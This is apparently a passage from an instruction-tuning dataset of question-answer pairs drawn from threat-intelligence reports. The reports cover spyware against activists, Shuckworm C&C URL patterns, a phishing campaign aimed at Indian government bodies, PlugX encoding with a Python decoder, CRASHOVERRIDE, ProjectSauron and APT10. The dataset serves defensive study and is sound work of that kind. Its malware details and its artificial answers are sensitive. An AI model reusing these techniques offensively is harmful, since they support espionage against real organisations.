Espionage Units,\" 2013.\n[23] S. Fagerland, M. Krakvik, J. Camp, and N. Moran, \"Operation Hangover: Unveiling an Indian Cyberattack Infrastructure,\" 2013.\n[24] R. Deibert and R. Rohozinski, \"Tracking GhostNet: Investigating a Cyber Espionage Network,\" Information Warfare Monitor, p. 6, 2009.\n[25] S. Nagaraja and R. Anderson, \"The snooping dragon: social-malware surveillance of the Tibetan movement,\" Tech. Rep., 2009.\n[26] F. C. Solutions, \"\"njRAT\" Uncovered,\" 2013, accessed: 25-June-2013. [Online]. Available: http://bit.ly/1eJheel\n[27] \"FinFisher - Excellence in IT Investigation,\" accessed: 27-February-2014. [Online]. Available: http://www.finfisher.com/\n[28] R. Rolles, \"Unpacking virtualization obfuscators,\" in USENIX WOOT, 2009.\n[29] \"TEMU: The BitBlaze Dynamic Analysis Component,\" accessed: 7-August-2013. [Online]. Available: http://bit.ly/1clcxSZ\n[30] \"'Reinstate sacked official' call,\" 2013, accessed: 11-November-2013. [Online]. Available: http://bit.ly/1aRUZ4b\n[31] \"Unionist Questioned,\" 2013, accessed: 23-April-2013. [Online]. Available: http://bit.ly/1gHnBiS\n[32] N. Villeneuve, \"Fake Skype Encryption Service Cloaks DarkComet Trojan,\" Apr. 2012, accessed: 4-August-2013. [Online]. Available: http://bit.ly/17SpA1c\n[33] E. Galperin and M. Marquis-Boire, \"Fake YouTube Site Targets Syrian Activists With Malware,\" Mar. 2012, accessed: 4-August-2013. [Online]. Available: http://bit.ly/HSCRet\n[34] \u2014\u2014, \"New Wave of Facebook Phishing Attacks Targets Syrian Activists,\" Apr. 2012, accessed: 4-August-2013. [Online]. Available: http://bit.ly/1hDQsG8\n[35] \u2014\u2014, \"Pro-Syrian Government Hackers Target Activists With Fake Anti-Hacking Tool,\" Aug. 2012, accessed: 4-August-2013. [Online]. Available: http://bit.ly/1eJj12T\n[36] J. Scott-Railton and M. Marquis-Boire, \"A Call to Harm: New Malware Attacks Target the Syrian Opposition,\" Citizen Lab, Tech. Rep., Jun. 2013, accessed: 3-August-2013. [Online]. Available: http://bit.ly/1a2l9PK\n[37] E. Galperin and M. Marquis-Boire, \"Trojan Hidden in Fake Revolutionary Documents Targets Syrian Activists,\" May 2012, accessed: 4-August-2013. [Online]. Available: http://bit.ly/1cSJT0\n[38] M. Marquis-Boire and S. Hardy, \"Syrian Activists Targeted with BlackShades Spy Software,\" Jun. 2012, accessed: 12-November-2013. [Online]. Available: http://bit.ly/1a2l6mX\n[39] S. Fagerland, \"The Syrian Spyware,\" Feb. 2012, accessed: 4-August-2013. [Online]. Available: http://bit.ly/HLyGR9\n[40] Telecomix, \"REPORT of a Syrian spyware,\" p. 9, Feb. 2012, accessed: 4-August-2013. [Online]. Available: http://bit.ly/1bsNcIk\n[41] S. Faris, \"The Hackers of Damascus,\" Nov. 2012, accessed: 9-August-2013. [Online]. Available: http://buswk.co/17t8RRH\n[42] L. Aylward, \"Malware Analysis\u2014Dark Comet RAT,\" Nov. 2011, accessed: 4-August-2013. [Online]. Available: http://bit.ly/16ZXgag\n[43] Quequero, \"DarkComet Analysis\u2014Understanding the Trojan used in Syrian Uprising,\" Mar. 2012, accessed: 4-August-2013. [Online]. Available: http://bit.ly/19i6kEl\n[44] S. Denbow and J. Hertz, \"Pest Control: Taming the RATs,\" p. 14, accessed: 12-November-2013. [Online]. Available: http://bit.ly/1fzLA0m\n[45] B. Brumfield, \"Computer spyware is newest weapon in Syrian conflict,\" Feb. 2012, accessed: 4-August-2013. [Online]. Available: http://cnn.it/HLz5TA\n[46] \"jalnosra.com,\" accessed: 27-February-2014. [Online]. Available: jalnosra.com\n[47] \"Skype Encryption.wmv,\" accessed: 27-February-2014. [Online]. Available: http://bit.ly/HZ3e1y\n[48] E. Galperin and M. Marquis-Boire, \"The Internet is Back in Syria and So is Malware Targeting Syrian Activists,\" Dec. 2012, accessed: 4-August-2013. [Online]. Available: http://bit.ly/1bngqFc\n[49] \"Free Syrian Army Sex Tape\u2014Abdul Razzaq Tlass [NSFW],\" accessed: 5-August-2013. [Online]. Available: http://bit.ly/1gHqDDH\n[50] A. Lund, \"Holy Warriors: A field guide to Syria's jihadi groups,\" Oct. 2012, accessed: 5-August-2013. [Online]. Available: http://atfp.co/17t8yq5\n[51] \"Ahmed Mansoor and Four Other Pro-Democracy Activists Pardoned and Freed,\" 2013, accessed: 10-November-2013. [Online]. Available: http://bit.ly/18pHpis\n[52] \"Royal Group,\" accessed: 27-February-2014. [Online]. Available: http://www.royalgroupuae.com/\n[53] T. Katsuki, \"Crisis for Windows Sneaks onto Virtual Machines,\" 2012, accessed: 27-February-2014. [Online]. Available: http://bit.ly/MzheRJ\n[54] \"Hacking Team,\" accessed: 27-February-2014. [Online]. Available: http://www.hackingteam.it/\n[55] \"MPRESS,\" accessed: 27-February-2014. [Online]. Available: http://www.matcode.com/mpress.htm\n[56] \"Sign in using application-specific passwords,\" accessed: 27-February-2014. [Online]. Available: https://support.google.com/accounts/answer/185833?hl=en\n[57] S. Fagerland, \"Systematic cyber attacks against Israeli and Palestinian targets going on for a year,\" 2012, accessed: 12-November-2013. [Online]. Available: http://bit.ly/1aSdw07\n[58] V. Silver, \"Spyware Leaves Trail to Beaten Activist Through Microsoft Flaw,\" 2012, accessed: 14-November-2013. [Online]. Available: http://bloom.bg/1ja2geI\n[59] B. Hubbard, \"Emirates Balk at Activism in Region Hit by Uprisings,\" 2013, accessed: 14-November-2013. [Online]. Available: http://nyti.ms/I4n2Aw\n[60] \"SPY NET,\" accessed: 27-February-2014. [Online]. Available: http://newspynetrat.blogspot.com/\n[61] \"Asprotect SKE,\" accessed: 27-February-2014. [Online]. Available: http://www.aspack.com/asprotect32.html\n[62] \"Unpacking VBInject/VBCrypt/RunPE,\" 2010, accessed: 7-August-2013. [Online]. Available: http://bit.ly/1e28nS2\n[63] \"Ultimate Packer for eXecutables,\" accessed: 27-February-2014. [Online]. Available: http://upx.sourceforge.net/\n[64] \"CVE-2013-0422,\" accessed: 27-February-2014. [On-line]. Available: http://bit.ly/NA1O0A\n[65] njq8, \"New java drive-by 2013-1-11,\" 2013, accessed: 27-February-2014. [Online]. Available: http://www.devpoint.com/vb/t357796.html\n[66] \"Appin Technology Lab,\" accessed: 27-February-2014. [Online]. Available: http://www.appinonline.com/\n[67] C. Guarnieri, \"Analysis of the FinFisher Lawful Interception Malware,\" 2012, accessed: 7-August-2013. [Online]. Available: http://bit.ly/1eJjVMV\n[68] H. Moore, \"Critical Research: Internet Security Survey,\" 2012.\n[69] \"Democracy Index 2012: Democracy at a Standstill,\" 2012, accessed: 7-August-2013. [Online]. Available: http://bit.ly/HSEDMD\n[70] \"YARA -The pattern matching swiss knife for malware researchers,\" accessed: 27-February-2014. [Online]. Available: http://plusvic.github.io/yara/\n[71] \"Cross-platform Trojan controls Windows and Mac machines,\" 2012, accessed: 7-August-2013. [Online]. Available: http://bit.ly/1eJnJgZ\n[72] S. Golovanov, \"Adobe Flash Player 0-day and Hack-ingTeam's Remote Control System,\" 2013, accessed: 7-August-2013. [Online]. Available: http://bit.ly/17n12ro\n[73] \"Internet Census 2012,\" 2013, accessed: 7-August-2013. [Online]. Available: http://bit.ly/1i7rRHs\nQuestion: How did the report identify the involvement of companies like Gamma International and Hacking Team in providing surveillance technology to governments, and what was their response to these allegations?",
    "output": "Answer: The report identified the involvement of companies like Gamma International and Hacking Team by tracing the technology used in targeted attacks back to its programmers and manufacturers. These companies were found to sell 'lawful intercept' trojans and related equipment purportedly exclusively to governments. The report also mentioned responses from these companies, which included denials or indirect acknowledgements of their involvement. For instance, Gamma International denied selling spyware to Bahrain, suggesting it might have been a stolen copy, while Hacking Team claimed that governments need their technology to 'look through their target's eyes' rather than relying solely on 'passive monitoring'.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: IOC patterns\nAnalysis of the many indicators of compromise (IOCs) uncovered during our investigations have revealed the following patterns, which may be of use when defending networks from Shuckworm attacks:\nMost URL C&C IPs belong to the short list of hosting providers listed in the SSU report, namely AS9123 TimeWeb Ltd. (Russia).\nMost discovered suspected C&C URLs are IP-based URLs and use a unique URI structure:\nhttp + IP + /<some-word>.php?<some-word>=<1-integer>,<5-7-rand-alphanums> OR\nhttp + IP + /<some-word>.php?<some-word>=<1-integer>,<5-7-rand-alphanums>-<2-integers>\nMost suspected malicious files are found in one of a short list of directories:\ncsidl_profile\\links\ncsidl_profile\\searches\nCSIDL_PROFILE\\appdata\\local\\temp\\\nCSIDL_PROFILE\\\nNearly all the suspected malicious files are made up of a word beginning with the letter \"d\" and a few are composed of two words separated by a \"-\" (first word also starting with \"d\"). Examples include:\ndeceive.exe\ndeceived.exe\ndeception.exe\ndeceptive.exe\ndecide.exe\ndecided.exe\ndecipher.exe\ndecisive.exe\ndeep-sunken.exe\ndeep-vaulted.exe\nDetected command lines are simple and consist of just the binary path + name; no switches, etc.\nMany suspected malicious files have unknown parent process hashes, none of which have available information.\nAccording to a (<https://ssu.gov.ua/en/novyny/sbu-vstanovyla-khakeriv-fsb-yaki-zdiisnyly-ponad-5-tys-kiberatak-na-derzhavni-orhany-ukrainy>)November 2021 report from the SSU, since 2014 the Shuckworm group has been responsible for over 5,000 attacks against more than 1,500 Ukrainian government systems. As evidenced by Symantec's recent investigations into attempted Shuckworm attacks against a number of organizations in Ukraine, this activity shows little sign of abating.\nThe Threat Hunter Team is a group of security experts within Symantec whose mission is to investigate targeted attacks, drive enhanced protection in Symantec products, and offer analysis that helps customers respond to attacks.\n\nQuestion: How does the Shuckworm group typically structure its Command and Control (C&C) URLs, and what patterns can be observed in these structures that could aid in detecting their activities?\n\nAnswer:",
    "output": "The Shuckworm group typically uses IP-based URLs for its Command and Control (C&C) servers, often following a specific URI structure. This structure includes an HTTP protocol followed by an IP address and a PHP file with query parameters. The pattern usually looks like this: 'http + IP + /<some-word>.php?<some-word>=<1-integer>,<5-7-rand-alphanums>' or 'http + IP + /<some-word>.php?<some-word>=<1-integer>,<5-7-rand-alphanums>-<2-integers>'. Understanding this pattern can help defenders create detection rules to identify potential Shuckworm C&C communications.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Malware Actors Using NIC Cyber Security Themed Spear Phishing to Target Indian Government Organizations\n1 month\nThis blog post describes an attack campaign where NIC ((<http://www.nic.in/>)National Informatics Centre) Cyber Security ago themed spear phishing email was used to possibly target Indian government organizations. In order to infect the victims, the attackers distributed spear-phishing email, which purports to have been sent from NIC's Incident response team, the attackers spoofed an email id that is associated with Indian Ministry of Defence to send out email to the victims. Attackers also used the name of the top NIC official in the signature of the email, this is to make it look like the email was sent by a high ranking Government official working at NIC (National Informatics Centre).\nBig Headline: Analysis of Word Document Containing Malicious Macro Code\nOnce the victim opens the attached word document it prompts the user to enable macro as shown below and the document also contains instruction on how to enable the macros.\nIf the victim enables the macro content, the malicious code drops the malware sample and exectutes it and it also shows a decoy document containing the instructions and guidelines related to cyber security. This is to make the user believe that is it indeed a document related to cyber security. Below are some of the screen shots showing the document that will shown to the user once the macro is enabled.\nThe malicious macro code was reverse engineered to understand its capabilities. The macro code is heavily obfuscated (uses obscure variable/function names to make analysis harder) as shown below.\nThe macro code first calls multiple functions to decode the executable content and then it drops the malicious executable (WINWORD.exe) in the Startup directory and then executes the dropped file as shown in the below screen shots.\nOnce the dropped file is executed by macro code it connects to the command and control server(c2 server) and to conceal the data sent by the malware, it communicates on port 443 (https) as shown below. The network traffic\npattern will be discussed in detail later.\nBig Headline: Analysis of the Dropped Executable (WINWORD.exe)\nThe dropped file was analyzed in an isolated environment (without actually allowing it to connect to the c2 server). This section contains the behavioral analysis of the dropped executable (WINWORD.exe).\nThe malware when executed creates additional files on the file system, It downloads these files by contacting the C2 server and saves it on the disk. Since the malware was not allowed to contact the C2 server its not clear about the functionality of these files. The below screen shots show WINWORD.exe creating an exectuable, VB script and VBE files. The malware uses WScript.exe to execute the VB scripts.\nAs mentioned above, malware once executed makes an https connection to the C2 server as shown below.\nBig Headline: C2 Communication Pattern\nUpon execution malware makes an https connection to the url hxxps://webmail[.]duia[.]in/webmail.php. The https connection was intercepted and different network communications were determined.\nIn the first communication it collects and sends the system information of the infected system to the attacker in the\nuser-agent field. The user-agent field contains information about the computer name, username and if the AntiVirus software is installed or not. The malware sends some information in the post data as well, the post data gives the information about the action that malware will perform. In the below screen shot notice the system information sent in the user-agent field and also from the post data it can be deduced that the malware downloads an exe file.\nMalware uses similar network communication pattern to download additional files (vbs, vbe, cmd, sc, ext, a3x etc). Once downloaded these files are saved in either \"%LocalAppData%\\Temp\\WindowsUpdates\" folder or in \"%Temp%\\WindowsUpdates\" folder. During analysis it was determined that the malware used these filenames (MS015-0012.exe, MS015-0012.vbs, MS015-0012.vbe etc.) to reside in these directories. Below screen shots shows some of the network communication made by the malware to download files.\nBig Headline: C2 Domain Information\nThis section contains details of the C2 domain (webmail[.]duia[.]in). Attackers used the DynamicDNS hostname\n(duia is a Dynamic DNS provider) to host the C2 server, this allows the attacker to quickly change the IP address in real time if the malware C2 server infrastructure is unavailable. The C2 domain currently resolves to an IP address shown below and the same domain was associated with another IP address previously. Both the IP addresses are associated with hosting providers as shown in the screen shot below\nBig Headline: Conclusion\nAttackers in this case made every attempt to launch a clever attack campaign by spoofing email address of Ministry of Defence, they also tried to trick the users to believe the email was sent from NIC's incident response team. To make the attack less suspicious they also used a legitimate PDF document in the attachment and used the name of the top NIC offical in the email signature. The attackers also hosted the C2 server in a Dynamic DNS provider network. We believe that such attacker groups are likely working to gain long-term access into Indian Government networks. With India rapidly moving towards digitization and cashless transactions we believe that more such cyber attacks will continue to target Government, Defence, NGOs and financial institutions. We have already reported this attack campaign and shared the associated indicators with the Indian CERT and NIC's Incident response team.\nFollow us on Twitter: (<https://twitter.com/monnappa22>)@monnappa22 (<https://twitter.com/cysinfo22>)@cysinfo22\n\nQuestion: Describe the communication pattern between the malware and the Command and Control (C2) server. What information was transmitted, and how did the malware conceal its activities?\n\nAnswer:",
    "output": "The malware established an HTTPS connection to the C2 server at hxxps://webmail[.]duia[.]in/webmail.php. Upon execution, it collected and sent system information, including the computer name, username, and whether antivirus software was installed, via the user-agent field. The malware also sent post data indicating actions it would perform, such as downloading additional files. To conceal its activities, the malware communicated over port 443 (HTTPS), making it difficult to detect through standard network monitoring. The use of dynamic DNS for the C2 server allowed the attackers to quickly change the IP address if needed, further complicating detection and mitigation efforts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Size Expansion of Configuration Information\nPlugX is designed to run based on its configuration information stored in itself. Our analysis revealed that the size of the configuration information has been expanded for the recent variant. While the former ones have either 0x2540 bytes (Observed since August 2013) or 0x2d58 bytes (Observed since June 2014), the recent one has 0x36a4 bytes, roughly 20% larger in size. This has led it to do more, such as:\n- Communication with more C&C servers \u2013 up to 16\n- P2P communication between infected nodes\n- MAC address check - PlugX runs if the MAC address of an infected host coincides with configuration information in itself (If not specified in the configuration, PlugX runs on any host).\n- (To bypass UAC) configurable setting for the process to abuse\nOther than these, new coding algorithm has been introduced.\nI will pick up some of the interesting features for more description. For details of the configuration file, you can refer to Appendix A in the bottom of this post.\nBig Headline: Additional Communication Protocol for C&C Servers\nFormer versions of PlugX used to set four C&C Server addresses to communicate with. With the P2P PlugX, attackers can set up to 16 C&C servers. Communication protocol with C&C servers has also been improved.\nFormer PlugX could only configure four communication protocols, but for P2P PlugX, protocol number 255 became available. This protocol is reserved by IANA, but no specific application is assigned.\nTable 1: Configurations and Communication Protocol which\nTable 1: Configurations and Communication Protocol which PlugX uses to connect to C&C Servers\nBig Headline: P2P Function Enabled\nP2P PlugX can communicate with other similarly-infected hosts. When one PlugX succeeds to infect a host, it then accesses to every IP address in the local network one-by-one and communicate with any connectable nodes, using one of the following protocols listed in Table 2.\nTable 2: Configurations and Communication Protocols which P2P PlugX uses to communicate by P2P\nWith P2P protocol, even if a PlugX exists in an environment with no direct access to the Internet, it may communicate with C&C server through other infected hosts. We have also seen some P2P-disabled samples.\nNote that this P2P communication theoretically can be applied to any other TCP/UDP ports. But in cases which JPCERT/CC has observed, P2P PlugX only uses either TCP/1357 or UDP/1357 for P2P communication. If you see any scanning activity to TCP/1357 or UDP/1357, we highly recommend that you conduct further investigation.\nBig Headline: New Encoding Algorithm\nPlugX uses a single encoding algorithm for inbound/outbound data, configuration, key logging data and strings used internally. Its encoding method has been modified from time to time, aligned with major upgrade of PlugX itself.\nLikewise, P2P PlugX has a new encoding algorithm. Here's a python code to decode.\ndef plugx_decode(data):\ndecode_key = struct.unpack_from('<I', data, 0)[0]    out = ''\n# XOR Values might possibly be varied.     key1 = decode_key ^ 20140918     key2 = decode_key ^ 353\nfor c in data[4:]:\n# ADD/SUB Values might possibly be varied.\nkey2 -= 39779\ndec = int(c) ^ (((key2 >> 16) & 0xff ^ ((key2 & 0xff ^ (((key1 >> 16) & 0xff ^ (key1 - (key1 >> 8) & 0xff)) - (key1 >> 24) & 0xff)) - (key2 >> 8) & 0xff)) - (key2 >> 24) & 0xff)        out = out + chr(dec)\nreturn out\n\nBased on the above text, answer a question. What is the purpose of the new encoding algorithm introduced in the P2P PlugX variant, and how does it differ from previous versions? Provide an example of how this algorithm works.",
    "output": "The new encoding algorithm in the P2P PlugX variant is used to encode and decode inbound/outbound data, configuration information, keylogging data, and internal strings. This encoding method has been updated to align with the major upgrade of PlugX, enhancing its security and obfuscation capabilities. The algorithm uses a combination of XOR operations and arithmetic shifts to encode data. An example of the decoding process in Python is as follows:\\n\\ndef plugx_decode(data):\\n    decode_key = struct.unpack_from('<I', data, 0)[0]\\n    out = ''\\n    key1 = decode_key ^ 20140918\\n    key2 = decode_key ^ 353\\n    for c in data[4:]:\\n        key2 -= 39779\\n        dec = int(c) ^ (((key2 >> 16) & 0xff ^ ((key2 & 0xff ^ (((key1 >> 16) & 0xff ^ (key1 - (key1 >> 8) & 0xff)) - (key1 >> 24) & 0xff)) - (key2 >> 8) & 0xff)) - (key2 >> 24) & 0xff)\\n        out = out + chr(dec)\\n    return out\\nThis algorithm demonstrates a more complex encoding scheme compared to previous versions, making it harder for analysts to reverse-engineer and understand the malware's behavior.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the OPC module in CRASHOVERRIDE create a Denial of Visibility, and what are the potential outcomes of this action?",
    "output": "The OPC module in CRASHOVERRIDE creates a Denial of Visibility by brute forcing values and sending out a 0x01 status, which equates to a 'Primary Variable Out of Limits' for the target systems. This misdirects operators from understanding protective relay status, leading to various systems performing actions on wrong information or reporting incorrect information to system operators. The outcome of this action is amplified misunderstanding and confusion while system operators troubleshoot the problem, as their system view will show breakers closed when they are open.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: VFS Structure\nThe VFS can have both a linear and a two-level hierarchical view. In the case of a two-level hierarchical view, one of the levels contains the data responsible for process injection, data stealing and storing it into the local ProjectSauron cache, and the second structure contains the data for exfiltration and external network communications. In the case of a linear view, all types of modules are located on a single level.\nCuriously, in many cases the same plugins are found in both the VFS upper and lower levels.\nTypically, a local cache of stolen files is located within the C:\\System Volume Information\\_restore{ED650925-A32C-4E9C-8A73-8E6F0509309A} folder, and keylogging results are stored in %WINDIR%\\Temp\\ folder under the names 'bka*.da' or '~*.tmp'.\nThe VFS has some pre-defined packages of plugins called 'blobs'.\nThe minimal set of plugins for process injection and stored data exfiltration is called kblog.blob and consists of the following modules:\n\u2022 detach\n\u2022 ilpsend\n\u2022 dir\n\u2022 skip\nIn some cases, there exists an 'extended' package variant used that redirects the exfiltration data stream through its own local proxy-server and wipes sent documents upon completion. The extended variant contains the following modules:\n\u2022 kgate\n\u2022 knatt\n\u2022 wipe\nInterestingly, there is no automatic wiping of the documents sent to the server in the 'minimal' package. It's assumed that this task should be carried out by second Lua-script (in the case of a hierarchical VFS \u2013 the parent or child). However, this assumption is not met in all cases. This means that in such cases the stolen documents are not removed and remain stored in the ProjectSauron cache forever, which suggests a design flaw.\nBig Headline: C2 Infrastructure\nThe ProjectSauron actor is extremely well prepared when it comes to operational security. Running an expensive cyberespionage campaign like ProjectSauron requires vast domain and server infrastructure uniquely assigned to each victim organization and never again reused. This makes traditional network-based indicators of compromise useless because they are never reused in any other organization.\nWe collected 28 domains linked to 11 IPs located in the United States and several European countries that might be connected to ProjectSauron campaigns.\nEven the diversity of ISPs selected for ProjectSauron operations makes it clear that the actor did everything possible to avoid creating patterns. Unfortunately, little is known about these servers.\nThe list of ProjectSauron domains follows (domains in bold were extracted from malware, the rest were found via Passive DNS and are not validated):\nBig Headline: Attribution\nAttribution is hard and reliable attribution is rarely possible in cyberspace. Even with confidence in various indicators and apparent attacker mistakes, there is a greater likelihood that these can all be smoke and mirrors created by an attacker with a greater vantage point and vast resources. When dealing with the most advanced threat actors, as is the case with ProjectSauron, attribution becomes an unsolvable problem.\nRather than speculate on the perpetrators behind such a sophisticated attack, we instead highlight a few relevant observations made during analysis.\nMedium Headline: Language Use\nAll human-written text is in English.\nCore scenarios that orchestrated ProjectSauron modules were written in Lua, a computer language that traditionally doesn't support the UTF-16 character set for string operations. However, the target systems had some local paths in a non-Latin character set thus creating the requirement to extend Lua to support UTF-16, which the developers of ProjectSauron did. This suggests that originally the ProjectSauron developers worked and tested their code on systems with a Latin character set and only after deploying it in a real-world scenario found Lua's features deficient. Instead of scraping their interpreter of choice, they decided to modify it to implement the missing features.\nOne of the configuration files we extracted contained a list of file extensions and keywords that contain Italian words:\nThe italian keywords and filenames targeted by ProjectSauron data theft modules can be translated as following:\nMost ProjectSauron modules contain standard embedded usage output in proficient English, i.e.\nSmall Headline: arping module\n-r Resolve hosts that answer.\n-l Print only replying Ips.\n-m Do not display MAC addresses.\nThis looks like a very traditional Unix-way of outputting simple command help/usage.\nHowever, there is no common style of outputting module usage and it varies from module to module. Here is an example of a different usage output:\nWhile it may look similar to the previous usage output an experienced user would recognize the difference: it looks more like a usage of command from Windows. The option '-?' is rarely seen in the Unix world, optional parameters are enclosed with '[' and ']' characters, mandatory parameters are enclosed with '<' and '>', etc.\nThe following example of usage output is indicative of an experienced Unix user with proper formatting:\nSmall Headline: basex module\nbasex [-b <base>] [-d [-f]] [-h]\nOptions:\n-b base  64, 64url, 32, 32url or 16. Default is 64\n-d Decode data. Default is to encode\n-f Force decoding when input is invalid/corrupt\n-h This cruft\nUses standard in/out. See man page for examples.\nIt seems that the same developer created several tools, as indicated by further identical-style usage formatting.\nThere is a noteworthy reference to a 'man page', a term for standard Unix manuals. Another unique language feature is usage of \"This cruft\" for the -h option. The term cruft is rarely used by non-native speakers and actually has a article to explain its use:\n\"Cruft is jargon for anything that is left over, redundant and getting in the way. It is used particularly for superseded and unused technical and electronic hardware and useless, superfluous or dysfunctional elements in computer software.\"\n...\n\"Around 1958, the term was used in the sense of \"garbage\" by students frequenting the MIT Tech Model Railroad Club.\"\n...\n\"The FreeBSD handbook uses the term to refer to leftover or superseded object code that accumulates in a folder or directory when software is recompiled and new executables and data files produced.\"\nOlder versions of software in the *BSD world, such as cryptcat or netcat (a very common universal network client/server tool for network testing) used identical option descriptions:\nIn fact, this unique way to comment the '-h' option is mostly found in netcat-derivative projects based on the original netcat developed by an old-school hacker known as 'hobbit' (hobbit@avian.org)1 , who first released the netcat source code back in 1995. Hobbit used the word \"cruft\" four times in the netcat110 source code from 1996:\nHowever, we do not believe that hobbit can be in any way related to the development of ProjectSauron modules. The more likely explanation is that the developers of the ProjectSauron modules are also old school hackers that develop advanced tools and use \"this cruft\" as a tribute to old and stable tools.\n1 Hobbit's personal page is at http://techno-fandom.org/~hobbit/\nBig Headline: Conclusions\nEvery APT attack we analyze brings with it some new knowledge about the nature of cyberespionage. The attackers are hackers first and foremost and, as proficient hackers, they invent novel ways to get into a network, do lateral movement, leave nearly no traces, all while exfiltrating valuable data.\nProjectSauron is a very advanced actor, comparable only to the top-of-the-top in terms of sophistication: alongside Duqu, Flame, Equation, and Regin. Whether related or unrelated to these advanced actors, the ProjectSauron attackers have definitely learned from these others.\nAs a reminder, here are some features of other APT attackers that ProjectSauron attackers had carefully learned from or emulated:\nDuqu:\n\u2022 Use of intranet C2s (that compromised target servers may act as independent C2s)\n\u2022 Running only in memory (persistence on a few gateway hosts only)\n\u2022 Use of different encryption methods per victim\n\u2022 Use of named pipes for LAN communication\n\u2022 Malware distribution through legitimate software deployment channels\nFlame:\n\u2022 Lua-embedded code\n\u2022 Secure file deletion (through data wiping)\n\u2022 Attacking air-gapped systems via removable devices\nEquation and Regin:\n\u2022 Usage of RC5/RC6 encryption\n\u2022 Virtual Filesystems (VFS)\n\u2022 Attacking air-gapped systems via removable devices\n\u2022 Hidden data storage on removable devices\nThese other actors also showed what makes them vulnerable to potential exposure and ProjectSauron did its best to address these issues:\n\u2022 Vulnerable or persistent C2 locations\n\u2022 ISP, IP, domains, and tool reuse across different campaigns\n\u2022 Crypto-algorithms reuse (as well as encryption keys)\n\u2022 Forensic evidence on disk\n\u2022 Timestamps in various components\n\u2022 Large volumes of network data or unusual protocols or message formats\nIn addition, it appears that the attackers took special care with what we consider as indicators of compromise and implemented a unique pattern for each and every target they attacked, so that the same indicators\nwould have little value for anyone else. This is a summary of the ProjectSauron strategy as we see it. The attackers clearly understand that we as researchers are always looking for patterns. Remove the patterns and the operation will be harder to discover. We are aware of more than 30 organisations attacked but we are sure that this is just a tiny tip of the iceberg.\nA common organisation hit by a serious actor such as ProjectSauron can hardly cope with proper detection and mitigation of such a threat on its own. As attackers become seasoned and more mature, the defending side will have to build an identical mindset: developing the highest technical skills comparable to those of the attackers in order to resist their onslaught.\nContact us at:\n\nWhat are the key differences between the 'minimal' and 'extended' plugin packages in ProjectSauron's VFS, and how do these differences impact the attack strategy?",
    "output": "The 'minimal' plugin package, called kblog.blob, includes modules for process injection and data exfiltration: detach, ilpsend, dir, and skip. The 'extended' package adds modules for redirecting exfiltration data through a local proxy-server and wiping sent documents: kgate, knatt, and wipe. The key difference is that the 'extended' package includes additional security measures to cover tracks by wiping documents, while the 'minimal' package does not automatically wipe sent documents. This impacts the attack strategy by providing a more secure and less traceable exfiltration process in the 'extended' package, making it harder for defenders to detect and analyze the attack.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Foreword\nThis report is an initial public release of research PwC UK and BAE Systems have conducted into new, sustained global campaigns by an established threat actor against managed IT service providers and their clients as well as several directly targeted organisations in Japan. Given the scale of those campaigns, the activity identified here is likely to reflect just a small portion of the threat actor's operations.\nThis report is primarily fact-based. Where we have made an assessment this has been made clear by phraseology such as \"we assess\", and the use of estimative language as outlined in Appendix A.\nBy publicly releasing this research, PwC UK and BAE Systems hope to facilitate broad awareness of the attack techniques used so that prevention and detection capabilities can be configured accordingly. It is also hoped that rapid progress can be made within the broader security community to further develop the understanding of the campaign techniques we outline, leading to additional public reports from peers across the security community.\nAs a part of our research and reporting effort, PwC UK and BAE Systems have collaborated with the UK's National Cyber Security Centre (NCSC) under its Certified Incident Response (CIR) scheme to engage and notify managed IT service providers, known affected organisations and other national bodies.\nSupplementary to this report, an Annex containing our technical analysis will be released.\nMedium Headline: APT10 has significantly increased its scale and capability since early 2016, including the addition of new custom tools.\n\u2022 APT10 ceased its use of the Poison Ivy malware family after a 2013 FireEye report, which comprehensively detailed the malware's functionality and features, and its use by several China-based threat actors, including APT10.\n\u2022 APT10 primarily used PlugX malware from 2014 to 2016, progressively improving and deploying newer versions, while simultaneously standardising their command and control function.\n\u2022 We have observed a shift towards the use of bespoke malware as well as open-source tools, which have been customised to improve their functionality. This is highly likely to be indicative of an increase in sophistication.\nMedium Headline: Infrastructure observed in APT10's most recent campaigns links to previous activities undertaken by the threat actor.\n\u2022 The command and control infrastructure used for Operation Cloud Hopper is predominantly dynamic-DNS domains, which are highly interconnected and link to the threat actor's previous operations. The number of dynamic-DNS domains in use by the threat actor has significantly increased since 2016, representative of an increase in operational tempo.\n\u2022 Some top level domains used in the direct targeting of Japanese entities share common IP address space with the network of dynamic-DNS domains that we associate with Operation Cloud Hopper.\nMedium Headline: PwC UK and BAE Systems assess APT10 as highly likely to be a China-based threat actor.\n\u2022 It is a widely held view within the cyber security community that APT10 is a China-based threat actor.\n\u2022 Our analysis of the compile times of malware binaries, the registration times of domains attributed to APT10, and the majority of its intrusion activity indicates a pattern of work in line with China Standard Time (UTC+8).\n\u2022 The threat actor's targeting of diplomatic and political organisations in response to geopolitical tensions, as well as the targeting of specific commercial enterprises, is closely aligned with strategic Chinese interests.\nMedium Headline: APT10 as a China-based threat actor\nPwC UK and BAE Systems assess it is highly likely that APT10 is a China-based threat actor with a focus on espionage and wide ranging information collection. It has been in operation since at least 2009, and has evolved its targeting from an early focus on the US defence industrial base (DIB)1 and the technology and telecommunications sector, to a widespread compromise of multiple industries and sectors across the globe, most recently with a focus on MSPs.\nAPT10, a name originally coined by FireEye, is also referred to as Red Apollo by PwC UK, CVNX by BAE Systems, Stone Panda by CrowdStrike, and menuPass Team more broadly in the public domain. The threat actor has previously been the subject of a range of open source reporting, including most notably a report by FireEye comprehensively detailing the threat actor's use of the Poison Ivy malware family2 and blog posts by Trend Micro3 similarly detailing the use of EvilGrab malware.\nAlongside the research and ongoing tracking of APT10 by both PwC UK and BAE's Threat Intelligence teams, PwC UK's Incident Response team has been engaged in supporting investigations linked to APT10 compromises. This research has contributed to the assessments and conclusions we have drawn regarding the recent campaign activity by APT10, which represents a shift from previous activities linked to the threat actor.\nAs a result of our analysis of APT10's activities, we believe that it almost certainly benefits from significant staffing and logistical resources, which have increased over the last three years, with a significant step-change in 2016. Due to the scale of the threat actor's operations 